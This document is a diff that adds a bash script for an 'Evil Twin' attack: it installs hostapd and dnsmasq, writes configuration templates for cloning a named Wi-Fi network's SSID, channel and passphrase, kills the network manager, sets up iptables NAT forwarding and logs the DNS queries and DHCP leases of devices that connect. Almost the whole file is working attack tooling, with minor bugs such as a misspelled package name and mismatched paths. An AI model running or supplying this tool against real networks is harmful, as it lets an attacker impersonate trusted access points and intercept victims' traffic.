@@ -1,0 +1,253 @@
+#!/bin/bash
+
+# Purpose: Spawns a Fake Access Point
+
+echo
+echo    "**************************"
+echo -e "****** \e[1;31;5mEVIL TWIN \e[0m*********"
+echo    "**************************"
+echo
+
+title="FAKE ACCESS POINT SCRIPT"
+HOSTNAME=$(hostname)
+DIRECTORY1="/usr/sbin/dnsmasq"
+DIRECTORY2="/usr/sbin/hostapd"
+DNSMASQCONF="eviltwin/dnsmasq.conf"
+HOSTAPDCONF="eviltwin/hostapd.conf"
+
+#################################### FUNCTIONS ##########################################
+Install_dnsmasq(){
+   apt-get install dnsmasq
+}
+Install_hostapd(){
+   apt-get install hostpad
+}
+
+Create_Eviltwin_dnsmasq(){
+   mkdir eviltwin;
+   cd eviltwin;
+   > eviltwin/dnsmasq.conf;
+   echo "interface= [interface name]" >> dnsmasq.conf #  Enter your wireless interface. 
+   echo "dhcp-range= [host address 1, host address 2, subnetmask, lease hours]" >> dnsmasq.conf # Specify DHCP address range and lease hour (e.g., "12h").
+   echo "dhcp-option= 3, [gateway IP address]" >> dnsmasq.conf # Option 3 specifies the gateway IP address.
+   echo "dhcp-option=6, [gateway IP address]" >>dnsmasq.conf # Option 6 configures DHCP clients to use the DNS servers provided. 
+   echo "server=8.8.8.8" >> dnsmasq.conf # 8.8.8.8 uses Google's DNS servers. 
+   echo "server=8.8.4.4" >> dnsmasq.conf # 8.8.4.4 uses Google's DNS servers.
+   echo "log-queries" >> dnsmasq.conf # Logs what DHCP clients are making DNS queries to.
+   echo "log-dhcp" >> dnsmasq.conf # Log current DHCP bindings.
+   echo "listen-address=127.0.0.1" >> dnsmasq.conf # Loopback address. 
+   echo >> dnsmasq.conf
+   echo "# Modify the network settings for wherever you see brackets '[].' See script for details." >> dnsmasq.conf
+   echo "# press [ctrl+s] to 'save' and then [ctrl+x] to 'exit." >> dnsmasq.conf
+}
+
+Edit_dnsmasq() {
+   cd eviltwin;
+   gnome-terminal -- nano dnsmasq.conf;
+   echo "\e[43m^^^G_MESSAGES_DEBUG\e[0m"
+   echo
+}
+
+Create_Eviltwin_hostapd() {
+   > hostapd.conf;
+   echo "interface= [interface name]" >> hostapd.conf
+   echo "driver=nl80211" >> hostapd.conf
+   echo "ssid= [Name of Cloned network]" >> hostapd.conf
+   echo "hw_mode=g" >> hostapd.conf
+   echo "channel= [#]" >> hostapd.conf
+   echo "macaddr_acl=0" >> hostapd.conf
+   echo "ignore_broadcast_ssid=0" >> hostapd.conf
+   echo "auth_algs=1" >> hostapd.conf
+   echo "wpa=2" >> hostapd.conf
+   echo "wpa_passphrase= [enter the passphrase for network]" >> hostapd.conf
+   echo "wpa_key_mgmt=WPA-PSK" >> hostapd.conf
+   echo "wpa_pairwise=CCMP" >> hostapd.conf
+   echo "wpa_group_rekey=86400" >> hostapd.conf
+   echo "ieee80211n=1" >> hostapd.conf
+   echo "wme_enabled=1" >> hostapd.conf
+   echo >> hostapd.conf
+   echo "# Modify the network settings for wherever you see brackets '[].' See script for details." >> hostapd.conf
+   echo "# press [ctrl+s] to 'save' and then [ctrl+x] to 'exit." >> hostapd.conf
+}
+
+Edit_hostapd() {
+   cd eviltwin;
+   gnome-terminal -- nano hostapd.conf;
+   echo -e "\e[43m^^^G_MESSAGES_DEBUG\e[0m"
+   echo
+  # echo "***Please edit the parameters in the 'hostapd.conf' and 'dnsmasq.conf' file to match the networks settings you desire: "
+}
+
+Kill_Processes() {
+    airmon-ng check kill
+}
+
+
+EVIL_TWIN_Start_hostapd() {
+   killall wpa_supplicant
+   killall NetworkManager
+   xterm -hold -e hostapd /root/eviltwin/hostapd.conf &
+}
+
+ip_tables(){
+   ifconfig ${INTERFACE} ${GATEWAY} netmask ${SUBNET};
+   iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE;
+   iptables --append FORWARD --in-interface ${INTERFACE} -j ACCEPT;
+   echo 1 > /proc/sys/net/ipv4/ip_forward
+}
+
+EVIL_TWIN_Start_dnsmasq() {
+   
+   xterm -hold -e dnsmasq -C /root/eviltwin/dnsmasq.conf -d
+}
+
+Restore_iptables(){
+   iptables -F
+   echo 
+   echo "\e[43miptables restored to default...\e[0m"
+}
+
+Restore_WiFi(){
+   NetworkManager Restart;
+   wpa_supplicant restart
+   echo "\e[43m${INTERFACE} is back up.\e[0m"
+}
+
+##############################  SCRIPT   ####################################
+
+#  CHECKS IF dsnmasq IS INSTALLED. IF NOT, IT WILL INSTALL...
+echo
+echo "Setting up..."
+echo
+echo "Checking for dnsmasq on ${HOSTNAME}..."
+
+if [[ -e $DIRECTORY1 ]]; then
+	sleep 1
+        echo -e "\e[1;32m--dnsmasq is installed on ${HOSTNAME}\e[0m."
+   elif Install_dnsmasq; then
+        echo -e "\e[1;32m--dnsmasq is now installed on ${HOSTNAME}\e[0m."
+   else
+        exit
+fi 
+
+
+#  CHECKS IF Hostapd IS INSTALLED. IF NOT, IT WILL INSTALL...
+echo
+echo "Checking for hostapd on ${HOSTNAME}..."
+
+if [[ -e $DIRECTORY2 ]]; then
+        sleep 1
+	echo -e "\e[1;32m--hostapd is installed on ${HOSTNAME}\e[0m."
+    elif Install_hostapd; then
+        echo -e "\e[1;32m--hostapd is now installed on ${HOSTNAME}\e[0m."
+    else
+        exit
+fi 
+
+
+
+# CHECKS FOR eviltwin/dnsmasq.conf. IF DOES NOT EXIST IT WILL INSTALL....
+echo
+echo "Checking for eviltwin/dnsmasq.conf..."
+if [[ -e $DNSMASQCONF ]]; then
+        sleep 1
+	echo -e "\e[1;32m--eviltwin/dnsmasq.conf already configured on ${HOSTNAME}\e[0m."
+    elif Create_Eviltwin_dnsmasq; then
+        sleep 2
+        echo -e "\e[1;32m--eviltwin/dnsmasq.conf now installed and configured on ${HOSTNAME}\e[0m."
+    else
+        exit
+fi
+
+
+
+# CHECKS FOR eviltwin/hostapd.conf. IF DOES NOT EXIST, IT WILL BE INSTALLED...
+#echo
+#echo
+#Edit_dnsmasq
+echo
+echo "Checking for eviltwin/hostapd.conf..."
+if [[ -e $HOSTAPDCONF ]]; then
+        sleep 1
+        echo -e "\e[1;32m--eviltwin/hostapd.conf already configured on ${HOSTNAME}\e[0m."
+    elif Create_Eviltwin_hostapd; then
+        echo -e "\e[1;32m--eviltwin/hostapd now installed and configured on ${HOSTNAME}\e[0m."
+    else
+        exit
+fi
+
+# THE hostapd.conf AND dnsmasq.conf FILES ARE OPENED....
+echo
+echo
+sleep 2
+Edit_dnsmasq && sleep 2
+Edit_hostapd
+
+# USER IS PROMPTED TO EDIT hostapd.conf AND dnsmasq.conf FILES....
+
+echo -e "\e[1;31;5m***Please edit the parameters in the 'hostapd.conf' and 'dnsmasq.conf' file to match the networks settings you desire: \e[0m"
+echo
+bold="`tput bold`"
+fg_green="`tput setaf 2`"
+sgr0="`tput sgr0`"
+read -p "${bold}${fg_green}Specify wireless adapter name for ${HOSTNAME}${sgr0}: " INTERFACE
+
+
+#  KILL INTERFERING PROCESSES...
+Kill_Processes
+echo
+echo -e "\e[1;31;5mKilled all interfering processes...\e[0m"
+
+# ENTER NETWORK ADDRESS, SUBNET MASK, AND GATEWAY ADDRESS...
+echo
+read -p "${bold}${fg_green}Enter Network Address (e.g., 10.0.0.0)${sgr0}: " NETWORK
+read -p "${bold}${fg_green}Enter Subnet Mask (e.g., 255.255.255.0)${sgr0}: " SUBNET
+read -p "${bold}${fg_green}Enter the Gateway address (e.g., 10.0.0.1)${sgr0}: " GATEWAY
+
+# CONFIGURE INTERFACE AND IPTABLES...
+echo
+echo "${bold}${fg_green}Configuring Interface ${INTERFACE} and iptables...${sgr0}"
+echo "." 
+sleep 1
+echo "." 
+sleep 1
+echo "." 
+sleep 1
+
+# TEST FOR IPTABLES SUCCESS...
+ip_tables
+if [[ $? -eq 0 ]]; then
+   echo "${bold}${fg_green}iptables configured.${sgr0}"
+else
+   Restore_iptables
+   Restore_WiFi
+fi
+
+########################### START THE EVIL TWIN ##################################
+
+# START hostapd....
+
+EVIL_TWIN_Start_hostapd
+if [[ $? -eq 0 ]]; then
+   echo
+   echo "${bold}${fg_green}Starting Eviltwin using hostapd...${sgr0}"
+else
+   Restore_iptables
+   Restore_WiFi
+fi
+
+# START dnsmasq...
+
+EVIL_TWIN_Start_dnsmasq
+if [[ $? -eq 0 ]]; then
+  echo
+  echo "${bold}${fg_green}Starting Eviltwin using dnsmasq...${sgr0}"
+else
+  Restore_iptables
+  Restore_WiFi
+fi
+
+
+
+
+
